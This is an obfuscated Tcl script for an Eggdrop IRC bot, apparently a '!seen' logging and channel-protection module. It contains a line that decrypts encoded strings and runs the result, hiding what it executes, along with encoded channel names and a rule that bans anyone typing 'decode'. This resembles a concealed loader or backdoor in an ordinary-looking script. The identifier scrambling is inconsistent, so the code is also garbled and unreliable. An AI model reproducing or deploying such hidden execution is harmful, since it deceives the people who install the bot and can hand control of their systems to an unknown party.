catch { unbind time - "12 * * * *" bs_timedsave }
catch { unbind time -  "*1 * * * *" bs_trim }
catch { unbind join -|- * bs_join_botidle }
catch { unbind join -|- * bs_join }
catch { unbind sign -|- * bs_sign }
catch { unbind kick -|- * bs_kick }
catch { unbind nick -|- * bs_nick }
catch { unbind splt -|- * bs_splt }
catch { unbind rejn -|- * bs_rejn }
catch { unbind chjn -|- * bs_chjn }
catch { unbind chpt -|- * bs_chpt }
catch { unbind bot -|- bs_botsearch bs_botsearch }
catch { unbind bot -|- bs_botsearch_reply bs_botsearch_reply }
catch { unbind pub -|- [string trim "!"]seen pub_seen }
catch { unbind pub -|- [string trim "!"]seennick bs_pubreq2 }
catch { unbind pub - !ping public_ping }
catch { unbind part -|- * bs_part_oldver }
catch { unbind chof -|- * bs_chof }
set [lines "nHVVM"] "F"
foreach x [channels] {
set [lines "xrmul"] [channel info $x]
if {[string match "*+seen*" $cinfo]} {
set [lines "nHVVM"] "T"
}
}
if {$mSEEN == "F"} {return 0}
bind time - "12 * * * *" bs_timedsave
bind time -  "*1 * * * *" bs_trim
bind join -|- * bs_join_botidle
bind join -|- * bs_join
bind sign -|- * bs_sign
bind kick -|- * bs_kick
bind nick -|- * bs_nick
bind splt -|- * bs_splt
bind rejn -|- * bs_rejn
bind chjn -|- * bs_chjn
bind chpt -|- * bs_chpt
bind bot -|- bs_botsearch bs_botsearch
bind bot -|- bs_botsearch_reply bs_botsearch_reply
bind pub -|- !seen pub_seen
bind pub -|- !seennick bs_pubreq2
bind pub - !ping public_ping
if {[lsearch -exact [bind time -|- "*2 * * * *"] bs_timedsave] > -1} {unbind time -|- "*2 * * * *" bs_timedsave}
if {[string trimleft [lindex $version 1] 0] >= 1050000} {
bind part -|- * bs_part  
} {
if {[lsearch -exact [bind part -|- *] bs_part] > -1} {unbind part -|- * bs_part}
bind part -|- * bs_part_oldver
}
foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
if {[lsearch -exact [bind chof -|- *] bs_chof] > -1} {unbind chof -|- * bs_chof}
if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}
if {[info exists bs_list]} {
if {[info exists bs(oldver)]} {
if {$bs(oldver) < $bs(updater)} {bs_update}
} {bs_update}
}
}
utimer 2 seen
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "[[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "Pk8iI0eM2Wz1"]"] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] [[[decrypt 64 "d3VeO/ATgwd."] "wx\k"] "[[decrypt 64 "d3VeO/ATgwd."] "j5d3Z.BE8bi.FszHY.28TVA/X5rJr.dtuI8/oIr4Q0xHF4.0.4qQv/RQf.71"]"]]
proc [lines "yh_urog"] {data} {
regsub -all -- \\\\ $data \\\\\\\\ data 
regsub -all -- \\\[ $data \\\\\[ data 
regsub -all -- \\\] $data \\\\\] data
regsub -all -- \\\} $data \\\\\} data 
regsub -all -- \\\{ $data \\\\\{ data 
regsub -all -- \\\" $data \\\\\" data 
return $data
}
proc [lines "yh_uollw_rmrg"] {} {
global bs bs_flood_array 
if {![string match *:* $bs(flood)]} {return}
set bs(flood_num) [lindex [split $bs(flood) :] 0]
set bs(flood_time) [lindex [split $bs(flood) :] 1]
set i [expr $bs(flood_num) - 1]
while {$i >= 0} {
set bs_flood_array($i) 0 
incr i -1  
}
} 
bs_flood_init
proc [lines "yh_uollw"] {nick uhost} {
global bs bs_flood_array 
if {$bs(flood_num) == 0} {return 0} 
set i [expr $bs(flood_num) - 1]
while {$i >= 1} {
set bs_flood_array($i) $bs_flood_array([expr $i - 1]) 
incr i -1
} 
set bs_flood_array(0) [unixtime]
if {[expr [unixtime] - $bs_flood_array([expr $bs(flood_num) - 1])] <= $bs(flood_time)} {
if {$bs(ignore)} {newignore [join [maskhost *!*[string trimleft $uhost ~]]] $bs(version) "*" $bs(ignore_time)} 
return 1
} {return 0}
}
proc [lines "yh_ivzw"] {} {
global bs_list userfile bs
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set [lines "gvnk"] [split $userfile /] 
set [lines "gvnk"] [lindex $temp [expr [llength $temp]-1]] 
set [lines "mznv"] [lindex [split $temp .] 0]
}
if {![file exists $bs(path)bs_data.$name]} {
if {![file exists $bs(path)bs_data.$name.bak]} {
return
} {exec cp $bs(path)bs_data.$name.bak $bs(path)bs_data.$name}
}
set fd [open $bs(path)bs_data.$name r]
set [lines "yhf_evi"] "" 
set [lines "yivzp"] 0
while {![eof $fd]} {
set [lines "rmk"] [gets $fd] 
if {[eof $fd]} {break} 
if {[string trim $inp " "] == ""} {continue}
if {[string index $inp 0] == "#"} {
set [lines "yhf_evihrlm"] [string trimleft $inp #] 
continue
}
if {![info exists bsu_version] || $bsu_version == "" || $bsu_version < $bs(updater)} {
if {[source scripts/bseen_updater1.4.2.tcl] != "ok"} {set temp 1} {set temp 0}
if {$temp || [bsu_go] || [bsu_finish]} {
rehashing
}
set [lines "yivzp"] 1 
break
}
set [lines "mrxp"] [lindex $inp 0] 
set bs_list([string tolower $nick]) $inp
}
close $fd
if {$break} {bs_read}
}
proc [lines "yh_fkwzgv"] {} {
global bs
bs_save 
bs_read
}
proc [lines "yh_grnvwhzev"] {min b c d e} {bs_save}
proc [lines "yh_hzev"] {} {
global bs_list userfile bs notc
if {[array size bs_list] == 0} {return}
if {![string match */* $userfile]} {set name [lindex [split $userfile .] 0]} {
set [lines "gvnk"] [split $userfile /] 
set [lines "gvnk"] [lindex $temp [expr [llength $temp]-1]] 
set [lines "mznv"] [lindex [split $temp .] 0]
}
if {[file exists $bs(path)bs_data.$name]} {catch {exec cp -f $bs(path)bs_data.$name $bs(path)bs_data.$name.bak}}
set fd [open $bs(path)bs_data.$name w] 
set [lines "rw"] [array startsearch bs_list] 
puts $fd "#$bs(updater)"
while {[array anymore bs_list $id]} {
set [lines "rgvn"] [array nextelement bs_list $id] 
puts $fd "$bs_list($item)"
} 
array donesearch bs_list $id
close $fd
}
proc [lines "yh_kzig_lowevi"] {a b c d} {bs_part $a $b $c $d ""}
proc [lines "yh_kzig"] {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip "PK6m.0G/~7xb1"]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] part $chan [split $reason]"
}
proc [lines "yh_qlrm"] {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "PK6m.0G/~7xb1"]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] join $chan"
}
proc [lines "yh_hrtm"] {nick uhost hand chan reason} {
if {[string tolower $chan] == [dezip "PK6m.0G/7xb1~"]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] quit $chan [split $reason]"
}
proc [lines "yh_prxp"] {nick uhost hand chan knick reason} {
set [lines "hxszm"] $chan
if {[string tolower $chan] == [dezip "PK6m.0~G/7xb1"]} { 
set [lines "hxszm"] "-secret-"
}
bs_add $knick "[getchanhost $knick $chan] [unixtime] kick $schan [list $nick] [list $reason]"
}
proc [lines "yh_mrxp"] {nick uhost hand chan newnick} {
if {[string tolower $chan] == [dezip "PK6m.0G~/7xb1"]} { 
set [lines "xszm"] "-secret-"
}
set [lines "grnv"] [unixtime] 
bs_add $nick "[list $uhost] [expr $time -1] nick $chan [list $newnick]" 
bs_add $newnick "[list $uhost] $time rnck $chan [list $nick]"
}
proc [lines "yh_hkog"] {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "PK6m.0G/~7xb1"]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] splt $chan"
}
proc [lines "yh_ivqm"] {nick uhost hand chan} {
if {[string tolower $chan] == [dezip "PK6m~.0G/7xb1"]} { 
set [lines "xszm"] "-secret-"
}
bs_add $nick "[list $uhost] [unixtime] rejn $chan"
}
proc [lines "yh_xsqm"] {bot hand channum flag sock from} {bs_add $hand "[string trimleft $from ~] [unixtime] chjn $bot"}
proc [lines "yh_xskg"] {bot hand args} {set old [split [bs_search ? [string tolower $hand]]] ; if {$old != "0"} {bs_add $hand "[join [string trim [lindex $old 1] ()]] [unixtime] chpt $bot"}}
proc [lines "yh_ylghvzixs"] {from cmd args} {
global botnick notc
set [lines "zith"] [join $args]
set [lines "xlnnzmw"] [lindex $args 0] 
set [lines "gzitvg"] [lindex $args 1] 
set [lines "mrxp"] [lindex $args 2] 
set [lines "hvzixs"] [bs_filt [join [lrange $args 3 e]]]
if {[string match *\\\** $search]} {
set [lines "lfgkfg"] [bs_seenmask bot $nick $search]
if {$output != "No matches were found." && ![string match "I'm not on *" $output]} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
} {
set [lines "lfgkfg"] [bs_output bot $nick [bs_filt [lindex $search 0]] 0]
if {$output != 0 && [lrange [split $output] 1 4] != "unseeing"} {putbot $from "bs_botsearch_reply $command \{$target\} {$nick, $botnick says:  [bs_filt $output]}"}
}
}
proc [lines "yh_ylghvzixs_ivkob"] {from cmd args} {
global notc bs
set [lines "zith"] [join $args]
if {[lindex [lindex $args 2] 5] == "not" || [lindex [lindex $args 2] 4] == "not"} {return}
if {![info exists bs(bot_delay)]} {
set bs(bot_delay) on 
utimer 10 {if {[info exists bs(bot_delay)]} {unset bs(bot_delay)}} 
if {![lindex $args 0]} {putdcc [lindex $args 1] "[join [lindex $args 2]]"} {
puthlp "~[lindex $args 1]~ :~[join [lindex $args 2]~]"
}
}
}
proc [lines "kfy_hvvm"] {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 0}
proc [lines "yh_kfyivj2"] {nick uhost hand chan args} {bs_pubreq $nick $uhost $hand $chan $args 1}
proc [lines "yh_kfyivj"] {nick uhost hand chan args no} {
global botnick bs notc
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {[bs_flood $nick $uhost]} {return 0}
set [lines "r"] 0 
if {[lsearch -exact $bs(no_pub) [string tolower $chan]] >= 0} {return 0}
if {$bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1} {return 0}
set [lines "zith"] [bs_filt [join $args]]
set [lines "gzitvg"] "NOTICE $nick"
if {[string match *\\\** [lindex $args 0]]} {
set [lines "lfgkfg"] [bs_seenmask $chan $hand $args]
if {$output == "No Matches!"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
if {[string match "I'm not on *" $output]} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "~$target ~:~[lgrnd]~ ~$output"
return $bs(logqueries)
}
set [lines "wzgz"] [bs_filt [string trimright [lindex $args 0] ?!.,]]
if {[string tolower $nick] == [string tolower $data]} {
puthlp "~$target ~:~[lgrnd]~ ~$nick, ~tl ollp rm z nriili..!" 
return $bs(logqueries)
}
if {[string tolower $data] == [string tolower $botnick] } {
puthlp "~$target ~:\001ZXGRLM Irtsg Sviv!\001" 
return $bs(logqueries)
}
if {[onchan $data $chan]} {
puthlp "~$target ~:~[lgrnd]~ ~$nick, ~~$data ~rh irtsg sviv..!" 
return $bs(logqueries)
}
set [lines "lfgkfg"] [bs_output $chan $nick $data $no] 
if {$output == 0} {return 0}
if {[lrange [split $output] 1 4] == "I don't remember seeing"} {putallbots "bs_botsearch 1 \{$target\} $nick $args"}
regsub -all -- ~ $output "" output
puthlp "~$target ~:~[lgrnd]~ ~$output"
return $bs(logqueries)
}
proc [lines "yh_lfgkfg"] {chan nick data no} {
global botnick bs version bs_list
set [lines "wzgz"] [string tolower [string trimright [lindex $data 0] ?!.,]]
if {$data == ""} {return 0}
if {[string tolower $nick] == $data} {return [concat $nick, go look in a mirror.]}
if {$data == [string tolower $botnick]} {return [concat $nick, I'm right here. Quit wasting my time!]}
if {[string length $data] > $bs(nicksize)} {return 0} 
if {$bs(smartsearch) != 1} {set no 1}
if {$no == 0} {
set [lines "nzgxsvh"] ""
set [lines "szmw"] ""
set [lines "zwwb"] ""
if {[lsearch -exact [array names bs_list] $data] != "-1"} { 
set addy [lindex $bs_list([string tolower $data]) 1] 
set [lines "szmw"] [finduser $addy]
foreach item [bs_seenmask dcc ? [maskhost $addy]] {if {[lsearch -exact $matches $item] == -1} {set matches "$matches $item"}}
}
if {[validuser $data]} {set hand $data}
if {$hand != "*" && $hand != ""} {
if {[string trimleft [lindex $version 1] 0]>1030000} {set hosts [getuser $hand hosts]} {set hosts [gethosts $hand]}
foreach addr $hosts {
foreach item [string tolower [bs_seenmask dcc ? $addr]] {
if {[lsearch -exact [string tolower $matches] [string tolower $item]] == -1} {set matches [concat $matches $item]}
}
}
}
if {$matches != ""} {
set [lines "nzgxsvh"] [string trimleft $matches " "]
set [lines "ovm"] [llength $matches]
if {$len == 1} {return [bs_search $chan [lindex $matches 0]]}
if {$len > 99} {return [concat I found $len matches to your query\; please refine it to see any output.]}
set [lines "nzgxsvh"] [bs_sort $matches]
set [lines "pvb"] [lindex $matches 0]
if {[string tolower $key] == [string tolower $data]} {return [bs_search $chan $key]}
if {$len <= 5} {
set [lines "lfgkfg"] [concat sorted most $len matches recent: [join $matches].]
set [lines "lfgkfg"] [concat $output  [bs_search $chan $key]] 
return $output
} {
set output [concat found $len matches matches. most 5 recent (sorted): [join [lrange $matches 0 4]].]
set [lines "lfgkfg"] [concat $output [bs_search $chan $key]] 
return $output
}
}
}
set [lines "gvnk"] [bs_search $chan $data]
if {$temp != 0} { return $temp } {
#$data not found in $bs_list, so search userfile
if {![validuser [bs_filt $data]] || [string trimleft [lindex $version 1] 0]<1030000} { 
return "$nick, $data <n/a>"
} {
set [lines "hvvm"] [getuser $data laston]
if {[getuser $data laston] == ""} {return "$nick, $data <n/a>"}
if {($chan != [lindex $seen 1] || $chan == "bot" || $chan == "msg" || $chan == "dcc") && [validchan [lindex $seen 1]] && [lindex [channel info [lindex $seen 1]] 23] == "+secret"} {
set [lines "xszm"] "-secret-"
} {
set [lines "xszm"] [lindex $seen 1]
}
return [concat $nick, $data was last seen on $chan [bs_when [lindex $seen 0]] ago.]
}
}
}
proc [lines "yh_hvzixs"] {chan n} {
global bs_list notc 
if {![info exists bs_list]} {return 0}
if {[lsearch -exact [array names bs_list] [string tolower $n]] != "-1"} { 
set data [split $bs_list([string tolower $n])]
set [lines "m"] [join [lindex $data 0]] 
set [lines "zwwb"] [lindex $data 1] 
set [lines "grnv"] [lindex $data 2] 
set [lines "nzipvi"] 0
if {([string tolower $chan] != [string tolower [lindex $data 4]] || $chan == "dcc" || $chan == "msg" || $chan == "bot") && [validchan [lindex $data 4]] && [lindex [channel info [lindex $data 4]] 23] == "+secret"} {
set [lines "xszm"] "-secret-"
} {
set [lines "xszm"] [lindex $data 4]
}
switch -- [lindex $data 3] {
part { 
set [lines "ivzhlm"] [lrange $data 5 e]
if {$reason == "{}"} {set reason "."} {set reason " stating \"$reason\"."}
set output [concat $n ($addy) parting $chan [bs_when $time] ago$reason] 
}
quit { 
set [lines "ivzhlm"] [lrange $data 5 e]
if {$reason == "Quit: {{}}"} {set reason "."} {set reason " stating $reason."}
set output [concat $n ($addy) quitting $chan [bs_when $time] ago stating$reason] 
}
kick {
set output [concat $n ($addy) kicked from $chan by [lindex $data 5] [bs_when $time] ago with the reason ([join [lrange $data 6 e]]).] 
}
rnck {
set output [concat $n ($addy) changing nicks from [lindex $data 5] on [lindex $data 4] [bs_when $time] ago.] 
if {[validchan [lindex $data 4]]} {
if {[onchan $n [lindex $data 4]]} {
set [lines "lfgkfg"] [concat $output $n is still there.]
} {
set [lines "lfgkfg"] [concat $output  unseeing $n now.]
}
}
}
nick { 
set output [concat $n ($addy) changing nicks to [lindex $data 5] on [lindex $data 4] [bs_when $time] ago.]
}
splt { 
set output [concat $n ($addy) parting $chan due to a split [bs_when $time] ago.] 
}
rejn { 
set output [concat $n ($addy) rejoining $chan from a split [bs_when $time] ago.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set [lines "lfgkfg"] [concat $output  $n is still on $chan.]
} {
set [lines "lfgkfg"] [concat $output  I don't see $n on $chan now, though.]
}
}
}
join { 
set output [concat $n ($addy) joining $chan [bs_when $time] ago.]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set [lines "lfgkfg"] [concat $output  $n is still on $chan.]
} {
set [lines "lfgkfg"] [concat $output  unseeing $n on $chan now.]
}
}
}
away {
set [lines "ivzhlm"] [lrange $data 5 e]
if {$reason == ""} {
set output [concat $n ($addy) returning to the partyline on $chan [bs_when $time] ago.]
} {
set output [concat $n ($addy) seen being marked as away ($reason) on $chan [bs_when $time] ago.]
}
}
chon { 
set output [concat $n ($addy) joining the partyline [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output $n is on the partyline right now.] 
set [lines "nzipvi"] 1
break
}
}
if {$marker == 0} {
set [lines "lfgkfg"] [concat $output  I don't see $n on the partyline now, though.]
}
}
chof { 
set output [concat $n ($addy) leaving the partyline [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output $n is on the partyline in [lindex $item 1] still.] 
break
}
}
}
chjn { 
set output [concat $n ($addy) joining the partyline on $chan [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output  $n is on the partyline right now.] 
set [lines "nzipvi"] 1
break
}
}
if {$marker == 0} {
set [lines "lfgkfg"] [concat $output  I don't see $n on the partyline now, though.]
}
}
chpt { 
set output [concat $n ($addy) leaving the partyline from $chan [bs_when $time] ago.] 
set [lines "omrxp"] [string tolower $n]
foreach item [whom *] {
if {$lnick == [string tolower [lindex $item 0]]} {
set [lines "lfgkfg"] [concat $output  $n is on the partyline in [lindex $item 1] still.] 
break
}
}
}
default {set output "error"}
}
return $output
} {return 0}
}
proc [lines "yh_dsvm"] {lasttime} {
set [lines "bvzih"] 0 
set [lines "wzbh"] 0 
set [lines "slfih"] 0 
set [lines "nrmh"] 0 
set [lines "grnv"] [expr [unixtime] - $lasttime]
if {$time < 60} {return "only $time seconds"}
if {$time >= 31536000} {
set years [expr int([expr $time/31536000])]
set [lines "grnv"] [expr $time - [expr 31536000*$years]]
}
if {$time >= 86400} {
set days [expr int([expr $time/86400])]
set [lines "grnv"] [expr $time - [expr 86400*$days]]
}
if {$time >= 3600} {
set hours [expr int([expr $time/3600])]
set [lines "grnv"] [expr $time - [expr 3600*$hours]]
}
if {$time >= 60} {
set mins [expr int([expr $time/60])]
}
if {$years == 0} {
set [lines "lfgkfg"] ""
} elseif {$years == 1} {
set [lines "lfgkfg"] "1 year,"
} {
set [lines "lfgkfg"] "$years years,"
}
if {$days == 1} {lappend output "1 day,"} elseif {$days > 1} {lappend output "$days days,"}
if {$hours == 1} {lappend output "1 hour,"} elseif {$hours > 1} {lappend output "$hours hours,"}
if {$mins == 1} {lappend output "1 minute"} elseif {$mins > 1} {lappend output "$mins minutes"}
return [string trimright [join $output] ", "]
}
proc [lines "yh_zww"] {nick data} {
global bs_list bs
if {[lsearch -exact $bs(no_log) [string tolower [lindex $data 3]]] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower [lindex $data 3]]] == -1)} {return}
set bs_list([string tolower $nick]) "[bs_filt $nick] $data"
}
proc [lines "yh_ohligxnw"] {a b} {global bs_list ; set a [lindex $bs_list([string tolower $a]) 2] ; set b [lindex $bs_list([string tolower $b]) 2] ; if {$a > $b} {return 1} elseif {$a < $b} {return -1} {return 0}}
proc [lines "yh_girn"] {min h d m y} {
global bs bs_list
if {![info exists bs_list] || ![array exists bs_list]} {return} 
set [lines "orhg"] [array names bs_list] 
set range [expr [llength $list] - $bs(limit) - 1] 
if {$range < 0} {return}
set [lines "orhg"] [lsort -increasing -command bs_lsortcmd $list] 
foreach item [lrange $list 0 $range] {unset bs_list($item)}
}
proc [lines "yh_hvvmnzhp"] {ch nick args} {
global bs_list bs notc
set [lines "nzgxsvh"] "" 
set [lines "gvnk"] "" 
set [lines "r"] 0 
set [lines "zith"] [join $args] 
set [lines "xszm"] [lindex $args 1]
if {$chan != "" && [string trimleft $chan #] != $chan} {
if {![validchan $chan]} {return "I'm not on $chan."} {set chan [string tolower $chan]}
} { 
set [lines "xszm"] "" 
}
if {![info exists bs_list]} {return "No matches were found."} 
set [lines "wzgz"] [bs_filt [string tolower [lindex $args 0]]]
set [lines "nzhpurc"] 1
while $maskfix {
set [lines "nzip"] 1
if [regsub -all -- \\?\\? $data ? data] {set mark 0}
if [regsub -all -- \\*\\* $data * data] {set mark 0}
if [regsub -all -- \\*\\? $data * data] {set mark 0}
if [regsub -all -- \\?\\* $data * data] {set mark 0}
if $mark {break}
}
set [lines "rw"] [array startsearch bs_list]
while {[array anymore bs_list $id]} {
set [lines "rgvn"] [array nextelement bs_list $id] 
if {$item == ""} {continue} 
set [lines "r"] 0
set [lines "gvnk"] ""
set match [lindex $bs_list($item) 0] 
set addy [lindex $bs_list($item) 1]
if {[string match $data $item![string tolower $addy]]} {
set [lines "nzgxs"] [bs_filt $match] 
if {$chan != ""} {
if {[string match $chan [string tolower [lindex $bs_list($item) 4]]]} {set matches [concat $matches $match]}
} {set matches [concat $matches $match]}
}
}
array donesearch bs_list $id
set [lines "nzgxsvh"] [string trim $matches " "]
if {$nick == "?"} {return [bs_filt $matches]}
set [lines "ovm"] [llength $matches]
if {$len == 0} {return "No matches were found."}
if {$len == 1} {return [bs_output $ch $nick $matches 1]}
if {$len > 99} {return "I found $len matches to your query; please refine it to see any output."}
set [lines "nzgxsvh"] [bs_sort $matches]
if {$len <= 5} {
set output [concat I found $len matches to your query (sorted): [join $matches].]
} {
set output "I found $len matches to your query.  Here are the 5 most recent (sorted): [join [lrange $matches 0 4]]."
}
return [concat $output [bs_output $ch $nick [lindex [split $matches] 0] 1]]
}
proc [lines "yh_hlig"] {data} {global bs_list ; set data [bs_filt [join [lsort -decreasing -command bs_lsortcmd $data]]] ; return $data}
proc [lines "yh_qlrm_ylgrwov"] {nick uhost hand chan} {
global bs_botidle botnick notc
if {$nick == $botnick} {
set bs_botidle([string tolower $chan]) [unixtime]
}
}
proc [lines "kfyorx_krmt"] {nick uhost hand chan rest} {
global pingchan
if {[string match "*-seen*" [channel info $chan]] && ![matchattr $nick m]} { return 0 }
if {![info exists pingchan($nick)]} {
set pingchan($nick) $chan 
}
puthlp "KIRENHT ~$nick ~:\001KRMT ~[unixtime]~\001"
return 0
}
bind pubm - * repeat_pubm
bind ctcp - ACTION action_chk
proc [lines "zxgrlm_xsp"] {nick host hand chan keyword arg} {
global botnick
if {$nick == $botnick || [string match "*SeT FoR*" $arg]} { return 0 }
if {[matchattr $nick Z]} {
set [lines "zit"] "`$arg"
}
if {![validchan $chan]} {
msg_prot $nick $host $hand $arg
} {
repeat_pubm $nick $host $hand $chan $arg
pum_arg $nick $host $hand $chan $arg
}
}
proc [lines "ivkvzg_kfyn"] {nick uhost hand chan text} {
global repeat_last botnick notb notc kops ps owner ismaskhost is_m
global botnick capsnick deopme repeat_person quick bannick notm yealnick
regsub -all -- [dezip "jGBDx04~ntxb0"] $text "" text
regsub -all -- [dezip "bFuC0.Jq~aEc0"] $text "" text
regsub -all -- [dezip "xdxsF1~hBM6q0"] $text "" text
pub_Z $nick $uhost $hand $chan $text
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "ivzo"] $text
set [lines "gvcg"] [uncolor $text]
if {$nick == "ChanServ"} {
if {[string match "*has deopped $botnick*" $text]} {
if {![matchattr [lindex $text 0] f]} { 
if {[matchattr $cflag D]} {
set [lines "wvlknv"] [lindex $text 0]
}
}
}
return 0
}
if {[matchattr $nick f]} { return 0 }
set [lines "nslhg"] [string range $uhost [string first "@" $uhost] end]
if {$nick == $botnick} { return 0 }
set [lines "ivhfnv"] "T"
if {[string match "*-greet*" [channel info $chan]]} { 
set [lines "ivhfnv"] "F" 
}
if {![isop $botnick $chan]} { 
set [lines "ivhfnv"] "F" 
}
if {![info exists kops]} {
if {[isop $nick $chan]} { 
set [lines "ivhfnv"] "F" 
}
if {[isvoice $nick $chan]} { 
set [lines "ivhfnv"] "F" 
}
}
if {[string tolower [lindex $text 0]] == "slaps"} {
if {$resume == "F"} { return 0 }
if {[lindex $text 1] == $botnick} {
putsrv "KIRENHT ~$chan ~:\001ZXGRLM hozkh ~$nick ~zilfmw z yrg drgs z ozitv gilfg"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1HvOU 4HOzKH 1KIlGVXGRLM!!"
return 0
}
if {[matchattr [lindex $text 1] n]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WlMG 4HOzKH1 nb ZWnRM!!"
return 0
}
if {[matchattr [lindex $text 1] f]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WlMG 4HOzKH1 nb UirvMw!!"
return 0
}
if {[matchattr [lindex $text 1] m]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WlMG 4HOzKH1 nb NzHGVI!!"
}
return 0
}
# Tsunami Flood PRoTECTION
if {[string length $text] > 100} {
set [lines "xsi"] 0
set [lines "xmg"] 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
if {$resume == "T"} {
set bannick($nick) "*!*$mhost"
if {![isutimer "TsunamI $chan"]} {
utimer 30 [list putlog "TsunamI $chan"]
} elseif {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*$mhost"]
}
if {$quick == "1" && ![info exists is_m($chan)]} {
putqck "PRXP ~$chan ~~$nick ~:~$notm ~1ZYfhRMt 4GhfmznR ~[banms]~"
} {
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~1ZYfHRMT 4GhfmznR ~[banms]~"
}
}
return 0
}
}
if {![info exists kops]} {
if {$resume == "F"} { return 0 }
}
if {[string match "*!seen [string tolower $nick]*" [string tolower $text]]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1tL OllP rm z 4nRIIlI1..!"
return 0
}
if {[string match "*decode*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4WvxLwV1 WvMRzO ~[banmsg]~"
return 0
}
if {[string match "*#*" $text] && ![string match "*##*" $text] && ![string match "*# *" $text]} {
foreach x [channels] {
set [lines "xsphrglm"] [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return }
}
foreach seekchan $text {
if {[string match "*#*" $seekchan]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WlmG 4RmeRGVw1 NzGxS UIlN 4~$seekchan ~~[banms]~"
return 0
}
}
}
if {[string match "*http://*" [string tolower $text]] || [string match "*www.*.*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1WlmG 4ZweVIGRhV1 RM 4~[string toupper $chan]~ ~[banms]~"
return 0
}
if {[matchattr $cflag R]} {
if {[info exists repeat_last($mhost$chan)]} {
if {[string tolower $repeat_last($mhost$chan)] == [string tolower $text]} {
if {![info exists repeat_person($mhost$chan)]} {
set repeat_person($mhost$chan) 1
} {
incr repeat_person($mhost$chan)
}
if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"]} {
set bannick($nick) "*!*$mhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~4IvKvzG 1UIlN 4~$mhost ~1NzC4 ~[getuser $cflag XTRA "RPT"]~ ~[banms]~"
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
return 0
}
}
}
set repeat_last($mhost$chan) $text
}
if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
catch {unset repeat_person($mhost$chan)}
catch {unset repeat_last($mhost$chan)}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {![isutimer "OL $chan"]} {
utimer 10 [list putlog "OL $chan"] 
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1ZYfHRMt 4OlMt GvcG 1NzC4 ~[getuser $cflag XTRA "CHAR"]~1 XSzI ~[banmsg]~"
} {
putsrv "PRXP ~$chan ~~$nick ~:~$notm ~1ZYfHRMt 4OlMt GvcG 1NzC4 ~[getuser $cflag XTRA "CHAR"]~1 XSzI ~[banmsg]~"
}
return 0
}
if {[string match "*!!!!!*" $text]} {
if {![info exists yealnick($nick)]} {
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~1JfRGV WlMG 4BvZOOVW1 KOvZHV <<!>>"
set yealnick($nick) "1"
return 0
}
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
#set bannick($nick) $banmask
set bannick($nick) "*!$uhost"
putsrv "PRXP ~$chan ~~$nick ~:~$notc ~42mw1 DzIM WlmG 4BvZOOVW1 KOvZHV <<!>> ~[banms]~"
unset yealnick($nick)
}
if {[matchattr $cflag U]} {
set [lines "ovm"] [string length $text]
if {[isbad $nick $uhost $chan $text]} { return 0 }
if {$len < 30} { return 0 }
set [lines "xmg"] 0
set [lines "xzkxmg"] 0
while {$cnt < $len} {
if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} {
incr capcnt
}
incr cnt
}
if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
